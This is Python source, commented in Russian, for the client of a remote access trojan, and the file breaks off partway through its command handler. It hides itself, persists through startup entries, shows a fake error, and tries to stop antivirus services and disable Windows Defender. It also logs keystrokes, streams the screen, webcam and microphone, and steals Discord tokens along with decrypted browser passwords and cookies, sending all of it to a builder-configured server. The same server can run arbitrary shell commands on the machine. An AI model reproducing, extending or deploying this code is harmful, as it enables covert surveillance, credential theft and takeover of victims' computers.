import socket
import subprocess
import os
import sys
import time
import threading
import cv2
import json
from io import BytesIO
from PIL import Image
import struct
import sounddevice as sd
import numpy as np
import webbrowser
import pyautogui # Для синхронизации мыши
import shutil
import sqlite3
import base64
import winreg # Для автозагрузки
import urllib.parse
from Crypto.Cipher import AES # pip install pycryptodome
import requests
import tempfile
import psutil # pip install psutil
import ctypes
import ctypes.wintypes
import re
# === ВШИВАЕТСЯ БИЛДЕРОМ ===
SERVER_HOST = "{SERVER_HOST}"
SERVER_PORT = {SERVER_PORT}
SLEEP_TIME = {SLEEP_TIME}
HIDE_CLIENT = {HIDE_CLIENT}
ADD_TO_STARTUP = {ADD_TO_STARTUP}
FAKE_ERROR_ON_RUN = {FAKE_ERROR_ON_RUN}
SELF_COPY = {SELF_COPY}
SELF_COPY_NAME = "{SELF_COPY_NAME}"
DISABLE_AV = {DISABLE_AV}
STEALTH_RENAME = {STEALTH_RENAME}
STEALTH_HIDE_FILE = {STEALTH_HIDE_FILE}
STEALTH_ADD_TO_STARTUP_HIDDEN = {STEALTH_ADD_TO_STARTUP_HIDDEN}

# --- Функции скрытия и автозагрузки ---
if sys.platform == "win32":
    if HIDE_CLIENT:
        ctypes.windll.kernel32.SetConsoleTitleW("System Service")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    if ADD_TO_STARTUP:
        try:
            # Используем путь к текущему исполняемому файлу
            current_exe = sys.executable
            # Определяем ключ реестра в зависимости от скрытости
            reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            if STEALTH_ADD_TO_STARTUP_HIDDEN:
                # Для скрытой автозагрузки можно использовать RunOnce, но это одноразово
                # Или использовать скрытый ключ, но это менее стабильно
                # Пока используем стандартный, но с флагом скрытия процесса
                # Альтернатива - создание ярлыка с флагом скрытия и добавление в Startup папку
                startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                if os.path.exists(startup_folder):
                    lnk_name = os.path.splitext(os.path.basename(current_exe))[0] + ".lnk"
                    lnk_path = os.path.join(startup_folder, lnk_name)
                    import pythoncom
                    from win32com.client import Dispatch
                    shell = Dispatch('WScript.Shell')
                    shortcut = shell.CreateShortCut(lnk_path)
                    shortcut.Targetpath = current_exe
                    shortcut.WindowStyle = 0 # 0 - скрытое окно
                    shortcut.save()
                    print(f"✅ Ярлык добавлен в автозагрузку: {lnk_path}")
                else:
                    # Если папка не найдена, используем реестр
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, f'"{current_exe}" /hide')
                    winreg.CloseKey(key)
            else:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, f'"{current_exe}"')
                winreg.CloseKey(key)
            print("✅ Добавлено в автозагрузку.")
        except Exception as e:
            print(f"❌ Ошибка добавления в автозагрузку: {e}")

    if FAKE_ERROR_ON_RUN:
        try:
            ctypes.windll.user32.MessageBoxW(0, "Ошибка обновления .NET Framework. Пожалуйста, перезагрузите систему.", "Ошибка", 0x10)
        except:
            pass # Игнорируем ошибки при показе фейковой ошибки

# --- САМОКОПИРОВАНИЕ ---
if SELF_COPY and not getattr(sys, 'frozen', False): # Не копируем, если уже exe
    try:
        source_path = sys.argv[0] # Путь к исходному скрипту
        if source_path.endswith('.py'):
            # Копируем .py файл
            new_name = SELF_COPY_NAME
            if STEALTH_RENAME:
                new_name = SELF_COPY_NAME
            destination_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", new_name)
            if source_path != destination_path:
                shutil.copyfile(source_path, destination_path)
                print(f"✅ Скопирован в {destination_path}")
                if STEALTH_HIDE_FILE:
                    import stat
                    os.chmod(destination_path, stat.S_HIDDEN)
                    print(f"✅ Файл {destination_path} скрыт.")
                # Запускаем копию и завершаем исходный процесс
                subprocess.Popen([sys.executable, destination_path] + sys.argv[1:])
                os._exit(0)
        elif source_path.endswith('.exe'):
            # Если уже exe, переименовываем при необходимости
            if STEALTH_RENAME and os.path.basename(source_path) != SELF_COPY_NAME:
                new_name = SELF_COPY_NAME
                new_path = os.path.join(os.path.dirname(source_path), new_name)
                if not os.path.exists(new_path):
                    os.rename(source_path, new_path)
                    print(f"✅ Переименован в {new_path}")
                    # Запускаем переименованный файл и завершаем исходный процесс
                    subprocess.Popen([new_path] + sys.argv[1:])
                    os._exit(0)
                else:
                    print(f"⚠️ Файл {new_path} уже существует, пропуск переименования.")
    except Exception as e:
        print(f"❌ Ошибка самокопирования: {e}")

# --- ОТКЛЮЧЕНИЕ АНТИВИРУСА ---
if DISABLE_AV:
    try:
        # Попытка остановить службы антивирусов (требует админских прав)
        av_services = [
            "WinDefend", # Windows Defender
            "MPService", # Windows Defender Antivirus Service
            "MsMpSvc",   # Microsoft Malware Protection Service
            "AVGIDSAgent", # AVG
            "AVGSafe",   # AVG
            "BDSafeAgent", # Bitdefender
            "K7Crypted", # K7
            "Norton Security", # Norton
            # Добавьте другие, если знаете их точные имена
        ]
        for service in av_services:
            try:
                subprocess.run(["sc", "stop", service], check=False, capture_output=True)
                print(f"✅ Попытка остановки службы: {service}")
            except:
                pass
        # Попытка отключить через gpedit.msc (требует Pro версию Windows)
        try:
            subprocess.run(["reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"], check=False, capture_output=True)
            print("✅ Попытка отключения Windows Defender через реестр.")
        except:
            pass
    except Exception as e:
        print(f"❌ Ошибка при попытке отключить AV: {e}")

# === KEYLOGGER ===
keylogs = ""
def start_keylogger():
    global keylogs
    try:
        from pynput import keyboard
        def on_press(key):
            global keylogs
            try:
                keylogs += key.char
            except:
                if key == keyboard.Key.space:
                    keylogs += " "
                elif key == keyboard.Key.enter:
                    keylogs += "\n"
                else:
                    keylogs += f" [{key}] "
            # Отправляем накопленные логи на сервер (например, каждые 10 символов или по таймеру)
            # Это улучшит "реал-тайм" ощущение
            if len(keylogs) >= 10: # Отправляем порцию
                try:
                    # Имитируем получение данных от клиента типа KEYLOGS
                    # В клиенте мы не отправляем их командой KEYLOGS, а отправляем как данные
                    send_data_to_server("KEYLOGS", keylogs.encode())
                    keylogs = "" # Очищаем буфер после отправки
                except:
                    pass # Игнорируем ошибки отправки в логгере

        keyboard.Listener(on_press=on_press, daemon=True).start()
    except:
        pass

start_keylogger()

def send_data_to_server(data_type, data=b""):
    # Эта функция нужна для отправки данных (например, кейлогов) без полного сокета
    # В реальности, для отправки из кейлоггера нужно будет использовать глобальный сокет
    # или очередь сообщений. Пока заглушка.
    pass

# === УПРАВЛЕНИЕ МЫШЬЮ (для синхронизации) ===
mouse_sync_active = False
last_mouse_pos = (0, 0)

def mouse_sync_loop(sock):
    global mouse_sync_active, last_mouse_pos
    while mouse_sync_active:
        try:
            x, y = pyautogui.position()
            if (x, y) != last_mouse_pos:
                last_mouse_pos = (x, y)
                send_data(sock, "MOUSE_POS", f"{x},{y}".encode())
            time.sleep(0.1) # Обновление позиции каждые 100мс
        except Exception as e:
            print(f"❌ Ошибка в потоке синхронизации мыши: {e}")
            break

def move_mouse(x, y):
    try:
        if sys.platform == "win32":
            pyautogui.FAILSAFE = False
            pyautogui.moveTo(x, y)
    except:
        pass

def send_data(sock, data_type, data=b""):
    try:
        # Формат: [4 байта длина типа данных][тип данных][4 байта длина данных][данные]
        header = struct.pack("!I", len(data_type)) + data_type.encode() + struct.pack("!I", len(data)) + data
        sock.sendall(header) # Используем sendall для гарантии отправки всех байтов
    except Exception as e:
        print(f"❌ Ошибка отправки данных ({data_type}): {e}")
        # Вызываем исключение, чтобы основной цикл переподключился
        raise

# --- ПОТОКИ ---
screen_streaming = False
webcam_streaming = False
audio_streaming = False
audio_stream_thread = None
screen_stream_thread = None
webcam_stream_thread = None
mouse_sync_thread = None

def screen_stream_loop(sock):
    global screen_streaming
    fps = 3.5  # 3.5 FPS
    interval = 1.0 / fps
    while screen_streaming:
        try:
            img = pyautogui.screenshot() # Используем pyautogui для скриншота
            buf = BytesIO()
            img.save(buf, 'JPEG', quality=50) # Среднее качество для баланса между размером и качеством
            send_data(sock, "SCREEN_STREAM", buf.getvalue())
        except Exception as e:
            print(f"❌ Ошибка в потоке скриншота: {e}")
            break
        time.sleep(interval)

def webcam_stream_loop(sock):
    global webcam_streaming
    fps = 2.5  # 2.5 FPS (изменили с 1.0 на 2-3)
    interval = 1.0 / fps
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("❌ Не удалось открыть веб-камеру для потоковой передачи.")
        try:
            send_data(sock, "ERROR", b"WeBCAM_STREAM: No webcam available")
        except:
            pass
        return

    try:
        while webcam_streaming:
            ret, frame = cap.read()
            if ret:
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = Image.fromarray(frame)
                buf = BytesIO()
                img.save(buf, 'JPEG', quality=60) # Среднее качество
                send_data(sock, "WEBCAM_STREAM", buf.getvalue())
            else:
                print("❌ Не удалось получить кадр с веб-камеры.")
                break
            time.sleep(interval)
    except Exception as e:
        print(f"❌ Ошибка в потоке веб-камеры: {e}")
    finally:
        cap.release()

def audio_callback(indata, frames, time, status, sock):
    """Callback для записи аудио и отправки его на сервер."""
    # Используем global для изменения переменной в области видимости модуля
    global audio_streaming
    if audio_streaming and status:
        print(f"Предупреждение о статусе аудио: {status}")
    if audio_streaming:
        try:
            # Преобразуем numpy array в байты
            audio_data = indata.tobytes()
            send_data(sock, "AUDIO", audio_data)
        except Exception as e:
            print(f"❌ Ошибка отправки аудио: {e}")
            # Остановим поток, если произошла ошибка
            audio_streaming = False # Изменяем глобальную переменную

def start_audio_stream(sock):
    global audio_streaming, audio_stream_thread
    if audio_streaming:
        print("Аудио-поток уже запущен.")
        return
    audio_streaming = True
    # Запускаем аудио-запись в отдельном потоке
    # sd.InputStream требует callback, который вызывается при получении данных
    try:
        # Параметры аудио: 22.05kHz, 1 канал (моно), 16-бит
        audio_stream_thread = sd.InputStream(
            callback=lambda indata, frames, time, status: audio_callback(indata, frames, time, status, sock),
            samplerate=22050,
            channels=1,
            dtype='int16',
            blocksize=1024 # Размер блока влияет на задержку
        )
        audio_stream_thread.start()
        print("🟢 Аудио-поток запущен.")
    except Exception as e:
        print(f"❌ Не удалось запустить аудио-поток: {e}")
        audio_streaming = False

def stop_audio_stream():
    global audio_streaming, audio_stream_thread
    if audio_stream_thread and audio_stream_thread.active:
        audio_stream_thread.stop()
        audio_stream_thread.close()
        audio_stream_thread = None
    audio_streaming = False
    print("🔴 Аудио-поток остановлен.")

# --- НОВОЕ: Функции стиллера (без win32crypt) ---
def get_discord_tokens():
    # Список возможных путей к leveldb Discord
    paths = [
        os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),  # Discord Canary
        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),    # Discord PTB
    ]
    tokens = []
    # Регулярное выражение для поиска Discord-токенов
    # Формат: "mfa.XXX", "OTkx...XXX", или "dQw4w9WgXcQ:..."
    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[\w+/=]{88}')
    for path in paths:
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith('.log') or file_name.endswith('.ldb'):
                    try:
                        with open(os.path.join(path, file_name), 'rb') as f: # Открываем в бинарном режиме
                            content = f.read()
                            # Декодируем как latin-1, чтобы не сломаться на бинарных данных
                            text = content.decode('latin-1')
                            matches = token_regex.findall(text)
                            for match in matches:
                                tokens.append(match)
                    except Exception as e:
                        print(f"❌ Ошибка при чтении {file_name} из {path}: {e}")
                        # Не добавляем токены, если файл не читается
    return list(set(tokens)) # Убираем дубликаты

def steal_discord_token(sock):
    tokens = get_discord_tokens()
    if tokens:
        data = "\n".join(tokens).encode()
        filename = f"discord_tokens_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        send_data(sock, "STEALER_DATA", filename.encode() + b"|" + data)
        print(f"💎 Найдены и отправлены токены Discord: {len(tokens)}")
    else:
        send_data(sock, "ERROR", b"STEALER: No Discord tokens found")

def get_browser_paths():
    browsers = {
        "chrome": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
        "firefox": os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
        "edge": os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
        "brave": os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
    }
    return browsers

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode() # Убираем тег GCM
        return decrypted_pass
    except:
        # Альтернатива без win32crypt - используем ctypes для вызова CryptUnprotectData
        try:
            # Подготовка данных для вызова
            blob_in = ctypes.wintypes.DATA_BLOB()
            blob_in.cbData = len(buff)
            blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(buff), ctypes.POINTER(ctypes.c_char))

            blob_out = ctypes.wintypes.DATA_BLOB()

            # Вызов CryptUnprotectData
            if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(blob_in),  # pDataIn
                None,                    # pp szDataDescr: Optional description
                None,                    # pOptionalEntropy: Optional entropy
                None,                    # pvReserved: Reserved
                None,                    # pPromptStruct: Optional prompt structure
                0,                       # dwFlags
                ctypes.byref(blob_out)   # pDataOut
            ):
                decrypted_pass = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode()
                # Освобождаем память
                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                return decrypted_pass
            else:
                print("❌ Не удалось расшифровать пароль с помощью CryptUnprotectData.")
                return ""
        except Exception as e:
            print(f"❌ Ошибка расшифровки пароля через ctypes: {e}")
            return ""

def steal_browser_passwords(sock):
    browsers = get_browser_paths()
    all_passwords = []
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            login_data_path = os.path.join(browser_path, "Default", "Login Data")
            if os.path.exists(login_data_path):
                try:
                    shutil.copyfile(login_data_path, os.path.join(tempfile.gettempdir(), "login_data.db"))
                    db_path = os.path.join(tempfile.gettempdir(), "login_data.db")
                    conn = sqlite3.connect(db_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    for result in cursor.fetchall():
                        password_decrypted = decrypt_password(result[2], get_master_key(browser_path))
                        all_passwords.append(f"{browser_name} | {result[0]} | {result[1]} | {password_decrypted}\n")
                    conn.close()
                    os.remove(db_path)
                except Exception as e:
                    print(f"❌ Ошибка получения паролей из {browser_name}: {e}")
    if all_passwords:
        data = "".join(all_passwords).encode()
        filename = f"browser_passwords_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        send_data(sock, "STEALER_DATA", filename.encode() + b"|" + data)
        print(f"💎 Найдены и отправлены пароли браузеров: {len(all_passwords)}")
    else:
        send_data(sock, "ERROR", b"STEALER: No browser passwords found")

def get_master_key(browser_path):
    try:
        with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:] # Убираем DPAPI
        # Расшифровываем мастер-ключ с помощью ctypes
        blob_in = ctypes.wintypes.DATA_BLOB()
        blob_in.cbData = len(master_key)
        blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(master_key), ctypes.POINTER(ctypes.c_char))

        blob_out = ctypes.wintypes.DATA_BLOB()

        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in),
            None, None, None, None, 0,
            ctypes.byref(blob_out)
        ):
            master_key_decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            # Освобождаем память
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return master_key_decrypted
        else:
            print("❌ Не удалось расшифровать мастер-ключ.")
            return None
    except Exception as e:
        print(f"❌ Ошибка получения мастер-ключа: {e}")
        return None

def steal_browser_cookies(sock):
    # Реализация аналогична паролям, но с cookies.db
    browsers = get_browser_paths()
    all_cookies = []
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            cookies_path = os.path.join(browser_path, "Default", "Network", "Cookies")
            if os.path.exists(cookies_path):
                try:
                    shutil.copyfile(cookies_path, os.path.join(tempfile.gettempdir(), "cookies.db"))
                    db_path = os.path.join(tempfile.gettempdir(), "cookies.db")
                    conn = sqlite3.connect(db_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT host_key, name, path, encrypted_value FROM cookies')
                    for result in cursor.fetchall():
                        cookie_decrypted = decrypt_password(result[3], get_master_key(browser_path))
                        all_cookies.append(f"{browser_name} | {result[0]} | {result[1]} | {result[2]} | {cookie_decrypted}\n")
                    conn.close()
                    os.remove(db_path)
                except Exception as e:
                    print(f"❌ Ошибка получения куки из {browser_name}: {e}")
    if all_cookies:
        data = "".join(all_cookies).encode()
        filename = f"browser_cookies_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        send_data(sock, "STEALER_DATA", filename.encode() + b"|" + data)
        print(f"💎 Найдены и отправлены куки браузеров: {len(all_cookies)}")
    else:
        send_data(sock, "ERROR", b"STEALER: No browser cookies found")

def steal_browser_history(sock):
    # Реализация аналогична паролям, но с History.db
    browsers = get_browser_paths()
    all_history = []
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            history_path = os.path.join(browser_path, "Default", "History")
            if os.path.exists(history_path):
                try:
                    shutil.copyfile(history_path, os.path.join(tempfile.gettempdir(), "history.db"))
                    db_path = os.path.join(tempfile.gettempdir(), "history.db")
                    conn = sqlite3.connect(db_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100') # Последние 100
                    for result in cursor.fetchall():
                        all_history.append(f"{browser_name} | {result[0]} | {result[1]} | {result[2]}\n")
                    conn.close()
                    os.remove(db_path)
                except Exception as e:
                    print(f"❌ Ошибка получения истории из {browser_name}: {e}")
    if all_history:
        data = "".join(all_history).encode()
        filename = f"browser_history_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        send_data(sock, "STEALER_DATA", filename.encode() + b"|" + data)
        print(f"💎 Найдена и отправлена история браузеров: {len(all_history)}")
    else:
        send_data(sock, "ERROR", b"STEALER: No browser history found")

def steal_downloads_screenshot(sock):
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    if os.path.exists(downloads_path):
        try:
            img = pyautogui.screenshot(region=(0, 0, 1920, 1080)) # Полный экран
            buf = BytesIO()
            img.save(buf, 'PNG')
            data = buf.getvalue()
            filename = f"downloads_screenshot_{time.strftime('%Y%m%d_%H%M%S')}.png"
            send_data(sock, "STEALER_DATA", filename.encode() + b"|" + data)
            print(f"💎 Скриншот папки Downloads отправлен.")
        except Exception as e:
            print(f"❌ Ошибка создания скриншота Downloads: {e}")
            send_data(sock, "ERROR", f"STEALER: {e}".encode())
    else:
        send_data(sock, "ERROR", b"STEALER: Downloads folder not found")

def find_files(sock, extension):
    drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    found_files = []
    for drive in drives:
        for root, dirs, files in os.walk(drive, topdown=True):
            # Ограничиваем глубину поиска для ускорения
            if root.count(os.sep) - drive.count(os.sep) > 5:
                del dirs[:] # Не заходить глубже
                continue
            for file in files:
                if file.lower().endswith(extension.lower()):
                    found_files.append(os.path.join(root, file))
            # Ограничиваем количество файлов для отправки
            if len(found_files) > 100:
                break
        if len(found_files) > 100:
            break
    if found_files:
        data = "\n".join(found_files).encode()
        filename = f"found_{extension[1:]}_files_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        send_data(sock, "STEALER_DATA", filename.encode() + b"|" + data)
        print(f"💎 Найдены и отправлены файлы с расширением {extension}: {len(found_files)}")
    else:
        send_data(sock, "ERROR", f"STEALER: No files with extension {extension} found".encode())

def scan_virus(sock):
    # Простая проверка на наличие процессов антивирусов
    antivirus_processes = [
        "avp.exe", "avpui.exe", # Kaspersky
        "rtvscan.exe", "mcshield.exe", # McAfee
        "msmpeng.exe", "msseces.exe", # Windows Defender
        "avgsvc.exe", "avg.exe", # AVG
        "bitdefender.exe", "bdagent.exe", # Bitdefender
        "norton.exe", "navapsvc.exe", # Norton
        "esrv.exe", "egui.exe", # ESET
        "ccapp.exe", "ca.exe", # CA / Norton
    ]
    found_avs = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() in [av.lower() for av in antivirus_processes]:
                found_avs.append(proc.info['name'])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

    data = f"Найденные AV процессы:\n" + "\n".join(found_avs) if found_avs else "Не найдено процессов известных антивирусов."
    filename = f"virus_scan_{time.strftime('%Y%m%d_%H%M%S')}.txt"
    send_data(sock, "STEALER_DATA", filename.encode() + b"|" + data.encode())
    print(f"💎 Результаты сканирования AV отправлены.")

# --- ОБРАБОТКА КОМАНД ---
def handle_command(sock, cmd):
    global keylogs, screen_streaming, webcam_streaming, audio_streaming, screen_stream_thread, webcam_stream_thread, mouse_sync_active, mouse_sync_thread
    try:
        # Используем partition для корректного разделения команды и аргумента
        if cmd.startswith("SCREEN"):
            # Один скриншот по запросу
            img = pyautogui.screenshot()
            buf = BytesIO()
            img.save(buf, 'JPEG', quality=40)
            send_data(sock, "SCREEN", buf.getvalue())

        elif cmd == "START_SCREEN_STREAM":
            if not screen_streaming:
                screen_streaming = True
                screen_stream_thread = threading.Thread(target=screen_stream_loop, args=(sock,), daemon=True)
                screen_stream_thread.start()
                print("🟢 Поток скриншота запущен.")
            else:
                print("Поток скриншота уже запущен.")

        elif cmd == "STOP_SCREEN_STREAM":
            screen_streaming = False
            if screen_stream_thread:
                screen_stream_thread.join(timeout=1) # Даем потоку время завершиться
            print("🔴 Поток скриншота остановлен.")

        elif cmd.startswith("WEBCAM"):
            # Один кадр по запросу
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = Image.fromarray(frame)
                buf = BytesIO()
                img.save(buf, 'JPEG', quality=60)
                send_data(sock, "WEBCAM", buf.getvalue())
            else:
                send_data(sock, "ERROR", b"No webcam")

        elif cmd == "START_WEBCAM_STREAM":
            if not webcam_streaming:
                webcam_streaming = True
                webcam_stream_thread = threading.Thread(target=webcam_stream_loop, args=(sock,), daemon=True)
                webcam_stream_thread.start()
                print("🟢 Поток веб-камеры запущен.")
            else:
                print("Поток веб-камеры уже запущен.")

        elif cmd == "STOP_WEBCAM_STREAM":
            webcam_streaming = False
            if webcam_stream_thread:
                webcam_stream_thread.join(timeout=1) # Даем потоку время завершиться
            print("🔴 Поток веб-камеры остановлен.")

        elif cmd == "START_AUDIO_STREAM":
            if not audio_streaming:
                start_audio_stream(sock)
            else:
                print("Аудио-поток уже запущен.")

        elif cmd == "STOP_AUDIO_STREAM":
            stop_audio_stream()

        elif cmd.startswith("START_MOUSE_SYNC"):
            if not mouse_sync_active:
                mouse_sync_active = True
                mouse_sync_thread = threading.Thread(target=mouse_sync_loop, args=(sock,), daemon=True)
                mouse_sync_thread.start()
                print("🟢 Синхронизация мыши запущена.")
            else:
                print("Синхронизация мыши уже запущена.")

        elif cmd.startswith("STOP_MOUSE_SYNC"):
            mouse_sync_active = False
            if mouse_sync_thread:
                mouse_sync_thread.join(timeout=1) # Даем потоку время завершиться
            print("🔴 Синхронизация мыши остановлена.")

        elif cmd.startswith("KEYLOGS"):
            # Отправляем накопленные логи и очищаем буфер
            #send_data(sock, "KEYLOGS", keylogs.encode()) # Убираем, т.к. логи отправляются в реал-тайм
            keylogs = "" # Очищаем локальный буфер при запросе

        elif cmd.startswith("OPEN_URL:"):
            # Используем partition для корректного извлечения URL
            _, _, url = cmd.partition(":")
            url = url.strip() # Убираем лишние пробелы
            # Открывает URL в браузере по умолчанию
            webbrowser.open(url)
            print(f"🌐 Открыт URL: {url}")

        elif cmd.startswith("RUN_APP:"):
            # Используем partition для корректного извлечения приложения
            _, _, app = cmd.partition(":")
            app = app.strip() # Убираем лишние пробелы
            # Запускает приложение
            subprocess.Popen(app, shell=True)
            print(f"🚀 Запущено приложение: {app}")

        elif cmd.startswith("CHAT_MSG:"):
            # Обработка сообщения от сервера
            _, _, msg = cmd.partition(":")
            msg = msg.strip()
            print(f"💬 Сообщение от сервера: {msg}")
            # Отправляем подтверждение, что сообщение получено
            send_data(sock, "CHAT_MSG", f"Received: {msg}".encode())

        elif cmd.startswith("FUNC_TOGGLE_EXPLORER:"):
            # Команда включить/выключить explorer.exe
            _, _, action = cmd.partition(":")
            action = action.strip()
            if action == "ON":
                subprocess.Popen(["start", "explorer.exe"], shell=True)
                print("✅ Explorer.exe включён.")
            elif action == "OFF":
                subprocess.Popen(["taskkill", "/f", "/im", "explorer.exe"], shell=True)
                print("❌ Explorer.exe выключен.")
            else:
                print(f"⚠️ Неизвестное действие для explorer: {action}")

        elif cmd.startswith("FUNC_SCARY_ACTION:"):
            # Пугающие функции (примеры)
            _, _, action = cmd.partition(":")
            action = action.strip()
            if action == "BLUE_SCREEN":
                # Показывает синий экран (требует админских прав и осторожности!)
                # subprocess.Popen(["taskkill", "/f", "/im", "winlogon.exe"], shell=True) # ОЧЕНЬ ОПАСНО
                print("⚠️ Попытка синего экрана (закомментирована для безопасности).")
                send_data(sock, "ERROR", b"FUNC_SCARY_ACTION: BLUE_SCREEN disabled for safety")
            elif action == "POPUP_MSG":
                # Показывает всплывающее сообщение
                import tkinter as tk
                from tkinter import messagebox
                root = tk.Tk()
                root.withdraw() # Скрываем основное окно
                messagebox.showwarning("Внимание!", "Ваш компьютер заражён!")
                root.destroy()
                print("⚠️ Показано всплывающее сообщение.")
            elif action == "LOCK_SCREEN":
                # Блокировка экрана
                import ctypes
                ctypes.windll.user32.LockWorkStation()
                print("🔒 Экран заблокирован.")
            else:
                print(f"⚠️ Неизвестное пугающее действие: {action}")
                send_data(sock, "ERROR", f"FUNC_SCARY_ACTION: Unknown action {action}".encode())

        elif cmd.startswith("FUNC_PLAY_SOUND:"):
            # Воспроизведение звука по URL (требует установки pygame или другого аудио фреймворка)
            _, _, url = cmd.partition(":")
            url = url.strip()
            print(f"🔊 Попытка воспроизвести звук с URL: {url}")
            try:
                import pygame # pip install pygame
                pygame.mixer.init()
                import urllib.request
                # Скачиваем звук во временный файл (лучше использовать NamedTemporaryFile)
                import tempfile
                with tempfile.NamedTemporaryFile(delete=False, suffix=".mp3") as tmp_file:
                    urllib.request.urlretrieve(url, tmp_file.name)
                    sound_file_path = tmp_file.name
                pygame.mixer.music.load(sound_file_path)
                pygame.mixer.music.play()
                # Ждём окончания воспроизведения (приблизительно)
                while pygame.mixer.music.get_busy():
                    time.sleep(0.1)
                # Удаляем временный файл
                os.remove(sound_file_path)
                print("✅ Звук воспроизведён.")
            except ImportError:
                print("❌ Pygame не установлен. pip install pygame")
                send_data(sock, "ERROR", b"FUNC_PLAY_SOUND: Pygame not installed")
            except Exception as e:
                print(f"❌ Ошибка воспроизведения звука: {e}")
                send_data(sock, "ERROR", f"FUNC_PLAY_SOUND: {e}".encode())

        elif cmd.startswith("FUNC_SHOW_IMAGE:"):
            # Показ картинки (требует PIL и tkinter)
            _, _, url = cmd.partition(":")
            url = url.strip()
            print(f"🖼️ Попытка показать изображение с URL: {url}")
            try:
                import tkinter as tk
                from PIL import Image, ImageTk
                import urllib.request
                import io
                import tempfile
                # Скачиваем изображение
                img_data = urllib.request.urlopen(url).read()
                img = Image.open(io.BytesIO(img_data))
                # Создаём окно для отображения
                root = tk.Tk()
                root.title("Сообщение от сервера")
                # Масштабируем изображение, если нужно
                # img.thumbnail((600, 400)) # Пример масштабирования
                photo = ImageTk.PhotoImage(img)
                label = tk.Label(root, image=photo)
                label.image = photo  # Сохраняем ссылку
                label.pack()
                root.mainloop() # Блокирует выполнение до закрытия окна
                print("🖼️ Изображение показано.")
            except Exception as e:
                print(f"❌ Ошибка показа изображения: {e}")
                send_data(sock, "ERROR", f"FUNC_SHOW_IMAGE: {e}".encode())

        elif cmd.startswith("FUNC_SET_WALLPAPER:"):
            # Установка обоев по URL
            _, _, url = cmd.partition(":")
            url = url.strip()
            print(f"🖼️ Попытка установить обои с URL: {url}")
            try:
                import urllib.request
                import tempfile
                import ctypes
                # Скачиваем изображение
                img_data = urllib.request.urlopen(url).read()
                # Сохраняем во временный файл
                with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp_file:
                    tmp_file.write(img_data)
                    wallpaper_path = tmp_file.name
                # Устанавливаем обои
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 3)
                print("✅ Обои установлены.")
                # Удаляем временный файл
                os.remove(wallpaper_path)
            except Exception as e:
                print(f"❌ Ошибка установки обоев: {e}")
                send_data(sock, "ERROR", f"FUNC_SET_WALLPAPER: {e}".encode())

        elif cmd.startswith("FUNC_DISABLE_INPUT:"):
            # Отключение ввода
            _, _, action = cmd.partition(":")
            action = action.strip()
            if action == "KEYBOARD":
